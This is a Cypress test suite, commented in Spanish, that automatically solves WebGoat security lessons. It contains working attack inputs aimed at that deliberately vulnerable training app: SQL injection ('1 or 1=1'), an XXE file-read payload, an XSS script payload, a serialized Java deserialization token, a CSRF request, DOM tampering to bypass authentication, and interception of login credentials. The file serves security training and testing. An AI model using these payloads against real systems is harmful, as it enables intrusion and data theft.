/// <reference types="cypress" />
import jwt_decode from 'jwt-decode'

describe('Test de seguridad de WebGoat', () => {
  beforeEach(() => {

    cy.clearCookies();
    cy.clearLocalStorage();

    cy.on('uncaught:exception', () => false)
    cy.visit('/')
    
    // cy.fixture('login').then(function (data) {
    //   this.data = data;
    // })    

    cy.get('#exampleInputEmail1').type('lostho')
    cy.get('#exampleInputPassword1').type('lostho')

    cy.get('.btn').click()
    
    cy.get('#user-menu')
      .should('have.length', 1)   
    cy.wait(3000)
  })

  it('Bypass del login', () => {
    cy.visit(
        '/start.mvc#lesson/AuthBypass.lesson/1'
    )

    cy.wait(3000)

    // Alteramos el DOM, que es la forma de conseguir explotar la página
    cy.get('[name="secQuestion0"]')
      .then(function($input){
        $input[0].setAttribute('name', 'secQuestion10')
      })
    .should('have.attr', 'name', 'secQuestion10')

    cy.get('[name="secQuestion1"]')
    .then(function($input){
      $input[0].setAttribute('name', 'secQuestion11')
    })
    .should('have.attr', 'name', 'secQuestion11')


    cy.get('[name="secQuestion10"]').type('ASA')
    cy.get('[name="secQuestion11"]').type('ASA')
    cy.get('#verify-account-form > [name="submit"]').click()

    cy.get('.assignment-success').should('be.visible')
  })

  it('Recovery question', () => {
    cy.visit(
        '/start.mvc#lesson/PasswordReset.lesson/3'
    )

    cy.wait(3000)

    cy.get('[name="username"]').type('Larry')
    cy.get('[name="securityQuestion"]').type('yellow')

    cy.get(':nth-child(6) > .btn').click()

    cy.get('.assignment-success').should('be.visible')
  })


  it('Relying in obscurity', () => {
    cy.visit(
        '/start.mvc#lesson/MissingFunctionAC.lesson/2'
    )

    cy.wait(3000)

    cy.request(
      {
        url: '/users',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        }
      }
    ).as('users')

    cy.get('@users')
      .its('body')
      .then((body) => {
        let userhash = null
        for (let x in body) {
          if (body[x].username == 'lostho') {
            userhash = body[x].userHash
          }
        }
         cy.get('[name="userHash"]').type(userhash)
         cy.get('[style=""] > .attack-container > .attack-form > [name="submit"]').click()

        cy.wait(3000)

        cy.get('.assignment-success').should('be.visible')
      })

  })

  it('Try It! Numeric SQL injection', () => {
    cy.visit(
      '/start.mvc#lesson/SqlInjection.lesson/9'
    )

    cy.wait(3000)

    cy.get('[name="login_count"]').type('1')
    cy.get('[name="userid"]').type('1 or 1=1')

    cy.wait(3000)


    cy.get(':nth-child(3) > :nth-child(2) > input').click()

    cy.wait(3000)

    cy.get('.assignment-success').should('be.visible')
  })

  it('Try It! Numeric SQL injection', () => {
    cy.visit(
      '/start.mvc#lesson/InsecureLogin.lesson/1'
    )

    cy.intercept('POST', '/WebGoat/start.mvc').as('login')

    cy.wait(3000)

    cy.get('.attack-container button').click()

    cy.wait('@login').then((interception) => {
      cy.get('[type="text"]').type(JSON.parse(interception.request.body).username)
      cy.get('[type="password"]').type(JSON.parse(interception.request.body).password)

      cy.get('[type="submit"]').click()

      cy.wait(3000)

      cy.get('.assignment-success').should('be.visible')
    })
  })

  it('XXE', () => {
    cy.visit(
      '/start.mvc#lesson/XXE.lesson/3'
    )

    cy.intercept('POST', '/WebGoat/xxe/simple', (request) => {
      request.body = `<?xml version="1.0"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]>
      <comment><text>&xxe;</text></comment>
      `
    })

    cy.wait(3000)

    cy.get('#commentInputSimple').type('datos')

    cy.get('#postCommentSimple').click()

    cy.wait(3000)
    cy.get('.assignment-success').should('be.visible')
  })

  it('Cross Site Scripting', () => {
    cy.visit(
      '/start.mvc#lesson/CrossSiteScripting.lesson/6'
    )

    cy.intercept('GET', '/WebGoat/CrossSiteScripting/attack5a*', (request) => {
      request.url = 'http://server:8080/WebGoat/CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&field2=222'
      request.body = "field1=%3Cscript%3Ealert('Hello')%3C/script%3E"
    })

    cy.wait(3000)

    cy.get('td > .btn').click()

    cy.wait(3000)
    cy.get('.attack-feedback').should('contain.text', "Congratulations")
  })

  it('Insecure serialization', () => {
    cy.visit(
      '/start.mvc#lesson/InsecureDeserialization.lesson/4'
    )

    cy.wait(3000)

    cy.get('[name="token"]').type('rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAANMABZyZXF1ZXN0ZWRFeGVjdXRpb25UaW1ldAAZTGphdmEvdGltZS9Mb2NhbERhdGVUaW1lO0wACnRhc2tBY3Rpb250ABJMamF2YS9sYW5nL1N0cmluZztMAAh0YXNrTmFtZXEAfgACeHBzcgANamF2YS50aW1lLlNlcpVdhLobIkiyDAAAeHB3DgUAAAflCwQGEjY3LVnYeHQAB3NsZWVwIDV0AAVkdW1teQ==')
    cy.get('[type="submit"]').click()

    cy.wait(3000)
    cy.get('.attack-feedback').should('contain.text', "Congratulations")
  })

  it('Cross Site Request Forgery', () => {
    cy.visit(
      '/start.mvc#lesson/CSRF.lesson/2'
    )

    cy.wait(3000)

    cy.request(
      {
        method: 'POST',
        url: '/csrf/basic-get-flag',
        // headers: {
        //   // 'Origin': 'http://server:8090',
        //   // 'Referer': 'http://server:8090/WebGoat/start.mvc'
        // }, 
        body: 'csrf=false&submit=Submit+Query'
      })
      .then((response) => {
      
        let res = response.body.flag

        cy.get('#confirm-flag-1 > [type="text"]').type(res)

        cy.get('#confirm-flag-1 > [name="submit"]').click()
  
        cy.wait(3000)
  
        cy.get('.assignment-success').should('be.visible')
      
      })
  })  

  it('Decoding a JWT token', () => {
    cy.visit('/start.mvc#lesson/JWT.lesson/2')

    cy.wait(3000)

    cy.get('[style=""] > .sect1 > .sectionbody > .listingblock > .content > .CodeRay > code')
      .invoke('text')
      .then((jwtToken => {
        let decodedHeader = jwt_decode(jwtToken);

        cy.get('.col-lg-10 > :nth-child(1) > input').type(decodedHeader.user_name)

        cy.get('.col-lg-10 > :nth-child(1) > button').click()

        cy.get('.attack-feedback').should('contain.text', "Congratulations")

      }));
  })
  
  it('Server Side Request Forgery', () => {
    cy.visit('/start.mvc#lesson/SSRF.lesson/1')

    cy.wait(3000)

    // Alteramos el DOM, que es la forma de conseguir explotar la página
    cy.get('#url1')
      .then(function($input){
        $input[0].setAttribute('value', 'images/jerry.png')
      })
    .should('have.attr', 'value', 'images/jerry.png')
    
    cy.get('[style=""] > .attack-container > .attack-form > table > tbody > tr > :nth-child(2) > input').click()

    cy.get('.assignment-success').should('be.visible')
  })

  afterEach(() => {
    cy.get('#user-menu').click()
    cy.get('#user-and-info-nav > .dropdown > .dropdown-menu > :nth-child(1) > a').click()
  })
})

